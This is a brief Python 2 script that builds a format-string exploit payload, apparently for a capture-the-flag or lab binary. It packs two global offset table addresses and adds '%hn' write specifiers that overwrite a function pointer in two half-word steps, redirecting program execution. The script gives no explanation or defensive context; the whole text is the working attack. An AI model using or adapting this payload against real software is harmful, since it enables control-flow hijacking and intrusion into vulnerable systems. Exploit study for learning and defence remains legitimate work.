import struct

fmt1 = "%{:d}x%10$hn".format(0xdda5 - 8)
fmt2 = "%{:d}x%11$hn".format(0xffff - 0xdda5)

lil_got = struct.pack("<I", 0x080497e0)
big_got = struct.pack("<I", 0x080497e2)

print lil_got + big_got + fmt1 + fmt2
